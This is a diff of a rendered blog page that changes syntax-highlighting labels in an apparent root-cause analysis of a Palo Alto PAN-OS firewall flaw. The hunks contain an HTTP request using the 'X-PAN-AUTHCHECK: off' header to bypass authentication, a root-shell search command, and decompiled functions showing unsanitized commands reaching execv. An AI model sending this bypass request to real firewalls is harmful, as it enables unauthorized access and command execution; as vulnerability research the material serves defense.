@@ -2374,17 +2374,17 @@
 
 <p>Therefore, by adding X-PAN-AUTHCHECK: off to the HTTP request header, an attacker can bypass the authentication check and illegally access PHP resources.</p>
 
-<div class="language-json highlighter-rouge"><div class="code-header">
-        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
+<div class="language-http highlighter-rouge"><div class="code-header">
+        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
-</pre></td><td class="rouge-code"><pre><span class="err">GET</span><span class="w"> </span><span class="err">/php/ztp_gate.php/.js.map</span><span class="w">  </span><span class="err">HTTP/</span><span class="mf">1.1</span><span class="w">
-</span><span class="err">Host:</span><span class="w"> </span><span class="mf">192.168</span><span class="err">.</span><span class="mf">32.251</span><span class="w">
-</span><span class="err">X-PAN-AUTHCHECK:</span><span class="w"> </span><span class="err">off</span><span class="w">
+</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/php/ztp_gate.php/.js.map</span>  <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">192.168.32.251</span>
+<span class="na">X-PAN-AUTHCHECK</span><span class="p">:</span> <span class="s">off</span>
 
-</span></pre></td></tr></tbody></table></code></div></div>
+</pre></td></tr></tbody></table></code></div></div>
 
 <p><a href="/assets/img/20250424/image7.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image7.png" alt="image.png" loading="lazy"></a></p>
 
@@ -2426,22 +2426,22 @@ Content-Length: 99
 
 <p>By executing the command find /usr/local/ -type f ! -path <em>“/cgroup/</em> “ ! -path <em>“/sys/</em> “ ! -path <em>“/tmp/</em> “ ! -path <em>“/cache/</em> “ ! -path <em>“/logs/</em> “ -exec grep -l “export panusername=” {} \; Searching for the file containing the command execution feature revealed that the feature exists in the pan_op_ctxt_get_env function in /usr/local/lib64/libpanmp_mp.so.1.0.</p>
 
-<div class="language-json highlighter-rouge"><div class="code-header">
-        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
-</pre></td><td class="rouge-code"><pre><span class="p">[</span><span class="err">root@PA-VM</span><span class="w"> </span><span class="err">/</span><span class="p">]</span><span class="err">#</span><span class="w"> </span><span class="err">find</span><span class="w"> </span><span class="err">/usr/local/</span><span class="w"> </span><span class="err">-type</span><span class="w"> </span><span class="err">f</span><span class="w"> </span><span class="err">!</span><span class="w"> </span><span class="err">-path</span><span class="w"> </span><span class="s2">"*/cgroup/*"</span><span class="w"> </span><span class="err">!</span><span class="w"> </span><span class="err">-path</span><span class="w"> </span><span class="s2">"*/sys/*"</span><span class="w"> </span><span class="err">!</span><span class="w"> </span><span class="err">-path</span><span class="w"> </span><span class="s2">"*/tmp/*"</span><span class="w"> </span><span class="err">!</span><span class="w"> </span><span class="err">-path</span><span class="w"> </span><span class="s2">"*/cache/*"</span><span class="w"> </span><span class="err">!</span><span class="w"> </span><span class="err">-path</span><span class="w"> </span><span class="s2">"*/logs/*"</span><span class="w"> </span><span class="err">-exec</span><span class="w"> </span><span class="err">grep</span><span class="w"> </span><span class="err">-l</span><span class="w"> </span><span class="s2">"export panusername="</span><span class="w"> </span><span class="p">{}</span><span class="w"> </span><span class="err">\;</span><span class="w">
-</span><span class="err">/usr/local/lib</span><span class="mi">64</span><span class="err">/libpanmp_mp.so.</span><span class="mf">1.0</span><span class="w">
-</span><span class="p">[</span><span class="err">root@PA-VM</span><span class="w"> </span><span class="err">/</span><span class="p">]</span><span class="err">#</span><span class="w"> 
-</span></pre></td></tr></tbody></table></code></div></div>
+</pre></td><td class="rouge-code"><pre><span class="o">[</span>root@PA-VM /]# find /usr/local/ <span class="nt">-type</span> f <span class="o">!</span> <span class="nt">-path</span> <span class="s2">"*/cgroup/*"</span> <span class="o">!</span> <span class="nt">-path</span> <span class="s2">"*/sys/*"</span> <span class="o">!</span> <span class="nt">-path</span> <span class="s2">"*/tmp/*"</span> <span class="o">!</span> <span class="nt">-path</span> <span class="s2">"*/cache/*"</span> <span class="o">!</span> <span class="nt">-path</span> <span class="s2">"*/logs/*"</span> <span class="nt">-exec</span> <span class="nb">grep</span> <span class="nt">-l</span> <span class="s2">"export panusername="</span> <span class="o">{}</span> <span class="se">\;</span>
+/usr/local/lib64/libpanmp_mp.so.1.0
+<span class="o">[</span>root@PA-VM /]# 
+</pre></td></tr></tbody></table></code></div></div>
 
 <p><a href="/assets/img/20250424/image11.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image11.png" alt="image.png" loading="lazy"></a></p>
 
 <p>The pan_mgmtop_handle_script_or_exec function first gets the username from the session via pan_cfg_get_username_by_cookie and saves <code class="language-plaintext highlighter-rouge">the payload</code> to the local_88 buffer. It then calls the pan_op_ctxt_get_env function to set up the command execution environment, including configuring environment variables and permissions. After setting up the environment, the system splices the user-supplied command or script parameters directly into the environment command string. Finally, this complete command string is passed to the pan_get_system_cmd_output function for execution and the result is returned.</p>
 
-<div class="language-json highlighter-rouge"><div class="code-header">
-        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
+<div class="language-c++ highlighter-rouge"><div class="code-header">
+        <span data-label-text="C++"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -2471,43 +2471,43 @@ Content-Length: 99
 27
 28
 29
-</pre></td><td class="rouge-code"><pre><span class="w">		</span><span class="err">//</span><span class="w"> </span><span class="err">获取用户信息</span><span class="w">
-    </span><span class="err">pan_cfg_get_username_by_cookie(param_</span><span class="mi">10</span><span class="err">,*(byte</span><span class="w"> </span><span class="err">**)(lVar</span><span class="mi">8</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0</span><span class="err">x</span><span class="mi">58</span><span class="err">),local_</span><span class="mi">88</span><span class="err">,</span><span class="mi">0</span><span class="err">x</span><span class="mi">40</span><span class="err">);</span><span class="w">
-    </span><span class="err">iVar</span><span class="mi">2</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">pan_cfg_get_adminrole_by_cookie(param_</span><span class="mi">10</span><span class="err">,*(char</span><span class="w"> </span><span class="err">**)(lVar</span><span class="mi">8</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0</span><span class="err">x</span><span class="mi">58</span><span class="err">));</span><span class="w">
+</pre></td><td class="rouge-code"><pre>		<span class="c1">// 获取用户信息</span>
+    <span class="n">pan_cfg_get_username_by_cookie</span><span class="p">(</span><span class="n">param_10</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="n">byte</span> <span class="o">**</span><span class="p">)(</span><span class="n">lVar8</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">),</span><span class="n">local_88</span><span class="p">,</span><span class="mh">0x40</span><span class="p">);</span>
+    <span class="n">iVar2</span> <span class="o">=</span> <span class="n">pan_cfg_get_adminrole_by_cookie</span><span class="p">(</span><span class="n">param_10</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">lVar8</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">));</span>
     
-    </span><span class="err">//</span><span class="w"> </span><span class="err">处理异步模式</span><span class="w">
-    </span><span class="err">if</span><span class="w"> </span><span class="err">(param_</span><span class="mi">17</span><span class="w"> </span><span class="err">!=</span><span class="w"> </span><span class="mi">0</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-      </span><span class="err">lVar</span><span class="mi">8</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">xmlHasProp(*(undefined</span><span class="mi">8</span><span class="w"> </span><span class="err">*)(*(long</span><span class="w"> </span><span class="err">*)(param_</span><span class="mi">11</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">8</span><span class="err">)</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0</span><span class="err">x</span><span class="mi">10</span><span class="err">)</span><span class="p">,</span><span class="s2">"async-mode"</span><span class="err">);</span><span class="w">
-      </span><span class="err">if</span><span class="w"> </span><span class="err">(lVar</span><span class="mi">8</span><span class="w"> </span><span class="err">!=</span><span class="w"> </span><span class="mi">0</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-        </span><span class="err">lVar</span><span class="mi">8</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">xmlGetProp(*(undefined</span><span class="mi">8</span><span class="w"> </span><span class="err">*)(*(long</span><span class="w"> </span><span class="err">*)(param_</span><span class="mi">11</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">8</span><span class="err">)</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0</span><span class="err">x</span><span class="mi">10</span><span class="err">)</span><span class="p">,</span><span class="s2">"jobid"</span><span class="err">);</span><span class="w">
-        </span><span class="err">if</span><span class="w"> </span><span class="err">(lVar</span><span class="mi">8</span><span class="w"> </span><span class="err">!=</span><span class="w"> </span><span class="mi">0</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-          </span><span class="err">//</span><span class="w"> </span><span class="err">如果有jobid，将其导出到环境变量</span><span class="w">
-          </span><span class="err">pan_string_buffer_appendf(lVar</span><span class="mi">5</span><span class="p">,</span><span class="s2">"export jobid=</span><span class="se">\"</span><span class="s2">%s</span><span class="se">\"</span><span class="s2">;"</span><span class="p">,</span><span class="err">lVar</span><span class="mi">8</span><span class="err">);</span><span class="w">
-          </span><span class="err">(*_xmlFree)(lVar</span><span class="mi">8</span><span class="err">);</span><span class="w">
-        </span><span class="p">}</span><span class="w">
-      </span><span class="p">}</span><span class="w">
-    </span><span class="p">}</span><span class="w">
+    <span class="c1">// 处理异步模式</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">param_17</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">lVar8</span> <span class="o">=</span> <span class="n">xmlHasProp</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_11</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">),</span><span class="s">"async-mode"</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">lVar8</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">lVar8</span> <span class="o">=</span> <span class="n">xmlGetProp</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_11</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">),</span><span class="s">"jobid"</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lVar8</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+          <span class="c1">// 如果有jobid，将其导出到环境变量</span>
+          <span class="n">pan_string_buffer_appendf</span><span class="p">(</span><span class="n">lVar5</span><span class="p">,</span><span class="s">"export jobid=</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">;"</span><span class="p">,</span><span class="n">lVar8</span><span class="p">);</span>
+          <span class="p">(</span><span class="o">*</span><span class="n">_xmlFree</span><span class="p">)(</span><span class="n">lVar8</span><span class="p">);</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
     
-    </span><span class="err">uVar</span><span class="mi">10</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">(ulong)param_</span><span class="mi">17</span><span class="err">;</span><span class="w">
-    </span><span class="err">//</span><span class="w"> </span><span class="err">获取命令执行环境</span><span class="w">
-    </span><span class="err">uVar</span><span class="mi">7</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">pan_op_ctxt_get_env(param_</span><span class="mi">12</span><span class="err">,lVar</span><span class="mi">5</span><span class="err">,local_</span><span class="mi">88</span><span class="err">,iVar</span><span class="mi">2</span><span class="err">,param_</span><span class="mi">17</span><span class="err">);</span><span class="w">
-    </span><span class="err">pcVar</span><span class="mi">9</span><span class="w"> </span><span class="err">=</span><span class="w"> 
-    </span><span class="s2">"&lt;response status=</span><span class="se">\"</span><span class="s2">error</span><span class="se">\"</span><span class="s2">&gt;&lt;msg&gt;&lt;line&gt;Unable to construct operational command&lt;/line&gt;&lt;/msg&gt;&lt;/response&gt;"</span><span class="err">;</span><span class="w">
-    </span><span class="err">uVar</span><span class="mi">6</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">extraout_XMM</span><span class="mi">0</span><span class="err">_Qa_</span><span class="mi">03</span><span class="err">;</span><span class="w">
+    <span class="n">uVar10</span> <span class="o">=</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">param_17</span><span class="p">;</span>
+    <span class="c1">// 获取命令执行环境</span>
+    <span class="n">uVar7</span> <span class="o">=</span> <span class="n">pan_op_ctxt_get_env</span><span class="p">(</span><span class="n">param_12</span><span class="p">,</span><span class="n">lVar5</span><span class="p">,</span><span class="n">local_88</span><span class="p">,</span><span class="n">iVar2</span><span class="p">,</span><span class="n">param_17</span><span class="p">);</span>
+    <span class="n">pcVar9</span> <span class="o">=</span> 
+    <span class="s">"&lt;response status=</span><span class="se">\"</span><span class="s">error</span><span class="se">\"</span><span class="s">&gt;&lt;msg&gt;&lt;line&gt;Unable to construct operational command&lt;/line&gt;&lt;/msg&gt;&lt;/response&gt;"</span><span class="p">;</span>
+    <span class="n">uVar6</span> <span class="o">=</span> <span class="n">extraout_XMM0_Qa_03</span><span class="p">;</span>
     
-    </span><span class="err">if</span><span class="w"> </span><span class="err">(</span><span class="mi">-1</span><span class="w"> </span><span class="err">&lt;</span><span class="w"> </span><span class="err">(int)uVar</span><span class="mi">7</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-      </span><span class="err">//</span><span class="w"> </span><span class="err">添加用户提供的命令/脚本到缓冲区</span><span class="w">
-      </span><span class="err">pan_string_buffer_append(lVar</span><span class="mi">5</span><span class="p">,</span><span class="err">param_</span><span class="mi">13</span><span class="err">);</span><span class="w">
+    <span class="k">if</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar7</span><span class="p">)</span> <span class="p">{</span>
+      <span class="c1">// 添加用户提供的命令/脚本到缓冲区</span>
+      <span class="n">pan_string_buffer_append</span><span class="p">(</span><span class="n">lVar5</span><span class="p">,</span><span class="n">param_13</span><span class="p">);</span>
       
-      </span><span class="err">iVar</span><span class="mi">2</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">pan_get_system_cmd_output(*(char</span><span class="w"> </span><span class="err">**)(lVar</span><span class="mi">5</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">8</span><span class="err">)</span><span class="p">,</span><span class="err">lVar</span><span class="mi">4</span><span class="p">,</span><span class="err">&amp;local_</span><span class="mi">8</span><span class="err">a);</span><span class="w">
-</span></pre></td></tr></tbody></table></code></div></div>
+      <span class="n">iVar2</span> <span class="o">=</span> <span class="n">pan_get_system_cmd_output</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">lVar5</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span><span class="n">lVar4</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_8a</span><span class="p">);</span>
+</pre></td></tr></tbody></table></code></div></div>
 
 <p><a href="/assets/img/20250424/image12.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image12.png" alt="image.png" loading="lazy"></a></p>
 
 <p>pan_get_system_cmd_output triggers the payload by calling pan_get_system_cmd_output_impl and then using execv within the pan_popen_no_stderr method in linpancommon_map.so.</p>
 
-<div class="language-json highlighter-rouge"><div class="code-header">
-        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
+<div class="language-c++ highlighter-rouge"><div class="code-header">
+        <span data-label-text="C++"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -2597,96 +2597,96 @@ Content-Length: 99
 87
 88
 89
-</pre></td><td class="rouge-code"><pre><span class="err">/**</span><span class="w">
- </span><span class="err">*</span><span class="w"> </span><span class="err">pan_popen_no_stderr</span><span class="w"> </span><span class="err">-</span><span class="w"> </span><span class="err">类似popen函数，执行命令但不处理标准错误输出</span><span class="w">
- </span><span class="err">*</span><span class="w"> </span><span class="err">创建一个管道并执行指定的命令，允许调用进程读取命令的标准输出</span><span class="w">
- </span><span class="err">*</span><span class="w"> </span><span class="err">@param_</span><span class="mi">1</span><span class="err">:</span><span class="w"> </span><span class="err">要执行的命令路径</span><span class="w">
- </span><span class="err">*</span><span class="w"> </span><span class="err">@param_</span><span class="mi">2</span><span class="err">:</span><span class="w"> </span><span class="err">命令的参数数组</span><span class="w">
- </span><span class="err">*</span><span class="w"> </span><span class="err">@return:</span><span class="w"> </span><span class="err">返回指向管道读取端的FILE指针，失败返回NULL</span><span class="w">
- </span><span class="err">*/</span><span class="w">
-</span><span class="err">FILE</span><span class="w"> </span><span class="err">*</span><span class="w"> </span><span class="err">pan_popen_no_stderr(char</span><span class="w"> </span><span class="err">*param_</span><span class="mi">1</span><span class="err">,char</span><span class="w"> </span><span class="err">**param_</span><span class="mi">2</span><span class="err">)</span><span class="w">
+</pre></td><td class="rouge-code"><pre><span class="cm">/**
+ * pan_popen_no_stderr - 类似popen函数，执行命令但不处理标准错误输出
+ * 创建一个管道并执行指定的命令，允许调用进程读取命令的标准输出
+ * @param_1: 要执行的命令路径
+ * @param_2: 命令的参数数组
+ * @return: 返回指向管道读取端的FILE指针，失败返回NULL
+ */</span>
+<span class="kt">FILE</span> <span class="o">*</span> <span class="nf">pan_popen_no_stderr</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_1</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">param_2</span><span class="p">)</span>
 
-</span><span class="p">{</span><span class="w">
-  </span><span class="err">int</span><span class="w"> </span><span class="err">iVar</span><span class="mi">1</span><span class="err">;</span><span class="w">               </span><span class="err">//</span><span class="w"> </span><span class="err">存储函数返回值</span><span class="w">
-  </span><span class="err">__pid_t</span><span class="w"> </span><span class="err">_Var</span><span class="mi">2</span><span class="err">;</span><span class="w">           </span><span class="err">//</span><span class="w"> </span><span class="err">存储子进程PID</span><span class="w">
-  </span><span class="err">FILE</span><span class="w"> </span><span class="err">*pFVar</span><span class="mi">3</span><span class="err">;</span><span class="w">            </span><span class="err">//</span><span class="w"> </span><span class="err">用于管理子进程的文件结构</span><span class="w">
-  </span><span class="err">long</span><span class="w"> </span><span class="err">in_FS_OFFSET;</span><span class="w">       </span><span class="err">//</span><span class="w"> </span><span class="err">栈保护值</span><span class="w">
-  </span><span class="err">FILE</span><span class="w"> </span><span class="err">*local_</span><span class="mi">30</span><span class="err">;</span><span class="w">          </span><span class="err">//</span><span class="w"> </span><span class="err">指向管道读取端的FILE指针</span><span class="w">
-  </span><span class="err">int</span><span class="w"> </span><span class="err">local_</span><span class="mi">28</span><span class="err">;</span><span class="w">            </span><span class="err">//</span><span class="w"> </span><span class="err">管道的读取端文件描述符</span><span class="w">
-  </span><span class="err">int</span><span class="w"> </span><span class="err">local_</span><span class="mi">24</span><span class="err">;</span><span class="w">            </span><span class="err">//</span><span class="w"> </span><span class="err">管道的写入端文件描述符</span><span class="w">
-  </span><span class="err">long</span><span class="w"> </span><span class="err">local_</span><span class="mi">20</span><span class="err">;</span><span class="w">           </span><span class="err">//</span><span class="w"> </span><span class="err">栈检查变量</span><span class="w">
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>               <span class="c1">// 存储函数返回值</span>
+  <span class="n">__pid_t</span> <span class="n">_Var2</span><span class="p">;</span>           <span class="c1">// 存储子进程PID</span>
+  <span class="kt">FILE</span> <span class="o">*</span><span class="n">pFVar3</span><span class="p">;</span>            <span class="c1">// 用于管理子进程的文件结构</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>       <span class="c1">// 栈保护值</span>
+  <span class="kt">FILE</span> <span class="o">*</span><span class="n">local_30</span><span class="p">;</span>          <span class="c1">// 指向管道读取端的FILE指针</span>
+  <span class="kt">int</span> <span class="n">local_28</span><span class="p">;</span>            <span class="c1">// 管道的读取端文件描述符</span>
+  <span class="kt">int</span> <span class="n">local_24</span><span class="p">;</span>            <span class="c1">// 管道的写入端文件描述符</span>
+  <span class="kt">long</span> <span class="n">local_20</span><span class="p">;</span>           <span class="c1">// 栈检查变量</span>
   
-  </span><span class="err">//</span><span class="w"> </span><span class="err">栈保护初始化</span><span class="w">
-  </span><span class="err">local_</span><span class="mi">20</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">*(long</span><span class="w"> </span><span class="err">*)(in_FS_OFFSET</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0</span><span class="err">x</span><span class="mi">28</span><span class="err">);</span><span class="w">
-  </span><span class="err">//</span><span class="w"> </span><span class="err">分配一个FILE结构体用于管理子进程</span><span class="w">
-  </span><span class="err">pFVar</span><span class="mi">3</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">(FILE</span><span class="w"> </span><span class="err">*)malloc(</span><span class="mi">0</span><span class="err">x</span><span class="mi">18</span><span class="err">);</span><span class="w">
-  </span><span class="err">local_</span><span class="mi">30</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">pFVar</span><span class="mi">3</span><span class="err">;</span><span class="w">
-  </span><span class="err">if</span><span class="w"> </span><span class="err">(pFVar</span><span class="mi">3</span><span class="w"> </span><span class="err">!=</span><span class="w"> </span><span class="err">(FILE</span><span class="w"> </span><span class="err">*)</span><span class="mi">0</span><span class="err">x</span><span class="mi">0</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="err">//</span><span class="w"> </span><span class="err">创建管道</span><span class="w">
-    </span><span class="err">iVar</span><span class="mi">1</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">pipe(&amp;local_</span><span class="mi">28</span><span class="err">);</span><span class="w">
-    </span><span class="err">if</span><span class="w"> </span><span class="err">(iVar</span><span class="mi">1</span><span class="w"> </span><span class="err">==</span><span class="w"> </span><span class="mi">0</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-      </span><span class="err">//</span><span class="w"> </span><span class="err">将管道读取端转换为FILE流</span><span class="w">
-      </span><span class="err">local_</span><span class="mi">30</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">fdopen(local_</span><span class="mi">28</span><span class="p">,</span><span class="s2">"r"</span><span class="err">);</span><span class="w">
-      </span><span class="err">if</span><span class="w"> </span><span class="err">(local_</span><span class="mi">30</span><span class="w"> </span><span class="err">==</span><span class="w"> </span><span class="err">(FILE</span><span class="w"> </span><span class="err">*)</span><span class="mi">0</span><span class="err">x</span><span class="mi">0</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-        </span><span class="err">//</span><span class="w"> </span><span class="err">如果转换失败，关闭管道的两端</span><span class="w">
-        </span><span class="err">close(local_</span><span class="mi">28</span><span class="err">);</span><span class="w">
-        </span><span class="err">close(local_</span><span class="mi">24</span><span class="err">);</span><span class="w">
-      </span><span class="p">}</span><span class="w">
-      </span><span class="err">else</span><span class="w"> </span><span class="p">{</span><span class="w">
-        </span><span class="err">//</span><span class="w"> </span><span class="err">锁定互斥锁避免竞态条件</span><span class="w">
-        </span><span class="err">pthread_mutex_lock((pthread_mutex_t</span><span class="w"> </span><span class="err">*)&amp;DAT_</span><span class="mi">009</span><span class="err">ea</span><span class="mi">140</span><span class="err">);</span><span class="w">
-        </span><span class="err">//</span><span class="w"> </span><span class="err">创建子进程</span><span class="w">
-        </span><span class="err">_Var</span><span class="mi">2</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">vfork();</span><span class="w">
-        </span><span class="err">if</span><span class="w"> </span><span class="err">(_Var</span><span class="mi">2</span><span class="w"> </span><span class="err">==</span><span class="w"> </span><span class="mi">0</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-          </span><span class="err">//</span><span class="w"> </span><span class="err">这是子进程代码</span><span class="w">
-          </span><span class="err">//</span><span class="w"> </span><span class="err">关闭管道读取端</span><span class="w">
-          </span><span class="err">close(local_</span><span class="mi">28</span><span class="err">);</span><span class="w">
-          </span><span class="err">pFVar</span><span class="mi">3</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">DAT_</span><span class="mi">009</span><span class="err">ea</span><span class="mi">120</span><span class="err">;</span><span class="w">
-          </span><span class="err">if</span><span class="w"> </span><span class="err">(local_</span><span class="mi">24</span><span class="w"> </span><span class="err">!=</span><span class="w"> </span><span class="mi">1</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-            </span><span class="err">//</span><span class="w"> </span><span class="err">将管道写入端复制到标准输出</span><span class="w">
-            </span><span class="err">dup</span><span class="mi">2</span><span class="err">(local_</span><span class="mi">24</span><span class="p">,</span><span class="mi">1</span><span class="err">);</span><span class="w">
-            </span><span class="err">close(local_</span><span class="mi">24</span><span class="err">);</span><span class="w">
-            </span><span class="err">pFVar</span><span class="mi">3</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">DAT_</span><span class="mi">009</span><span class="err">ea</span><span class="mi">120</span><span class="err">;</span><span class="w">
-          </span><span class="p">}</span><span class="w">
-          </span><span class="err">//</span><span class="w"> </span><span class="err">关闭所有打开的文件描述符</span><span class="w">
-          </span><span class="err">for</span><span class="w"> </span><span class="err">(;</span><span class="w"> </span><span class="err">pFVar</span><span class="mi">3</span><span class="w"> </span><span class="err">!=</span><span class="w"> </span><span class="err">(FILE</span><span class="w"> </span><span class="err">*)</span><span class="mi">0</span><span class="err">x</span><span class="mi">0</span><span class="err">;</span><span class="w"> </span><span class="err">pFVar</span><span class="mi">3</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">*(FILE</span><span class="w"> </span><span class="err">**)pFVar</span><span class="mi">3</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-            </span><span class="err">iVar</span><span class="mi">1</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">fileno((FILE</span><span class="w"> </span><span class="err">*)pFVar</span><span class="mi">3</span><span class="err">-&gt;_IO_read_ptr);</span><span class="w">
-            </span><span class="err">close(iVar</span><span class="mi">1</span><span class="err">);</span><span class="w">
-          </span><span class="p">}</span><span class="w">
-          </span><span class="err">//</span><span class="w"> </span><span class="err">执行指定的命令</span><span class="w"> </span><span class="err">-</span><span class="w"> </span><span class="err">这里是执行命令的关键部分</span><span class="w">
-          </span><span class="err">execv(param_</span><span class="mi">1</span><span class="p">,</span><span class="err">param_</span><span class="mi">2</span><span class="err">);</span><span class="w">
-          </span><span class="err">//</span><span class="w"> </span><span class="err">如果execv返回，表示出错</span><span class="w">
-          </span><span class="err">_exit(</span><span class="mi">0</span><span class="err">x</span><span class="mi">7</span><span class="err">f);</span><span class="w">
-        </span><span class="p">}</span><span class="w">
-        </span><span class="err">//</span><span class="w"> </span><span class="err">父进程继续执行</span><span class="w">
-        </span><span class="err">pthread_mutex_unlock((pthread_mutex_t</span><span class="w"> </span><span class="err">*)&amp;DAT_</span><span class="mi">009</span><span class="err">ea</span><span class="mi">140</span><span class="err">);</span><span class="w">
-        </span><span class="err">//</span><span class="w"> </span><span class="err">关闭管道写入端</span><span class="w">
-        </span><span class="err">close(local_</span><span class="mi">24</span><span class="err">);</span><span class="w">
-        </span><span class="err">if</span><span class="w"> </span><span class="err">(</span><span class="mi">0</span><span class="w"> </span><span class="err">&lt;</span><span class="w"> </span><span class="err">_Var</span><span class="mi">2</span><span class="err">)</span><span class="w"> </span><span class="p">{</span><span class="w">
-          </span><span class="err">//</span><span class="w"> </span><span class="err">保存子进程的信息</span><span class="w">
-          </span><span class="err">*(__pid_t</span><span class="w"> </span><span class="err">*)&amp;pFVar</span><span class="mi">3</span><span class="err">-&gt;_IO_read_end</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">_Var</span><span class="mi">2</span><span class="err">;</span><span class="w">
-          </span><span class="err">pFVar</span><span class="mi">3</span><span class="err">-&gt;_IO_read_ptr</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">(char</span><span class="w"> </span><span class="err">*)local_</span><span class="mi">30</span><span class="err">;</span><span class="w">
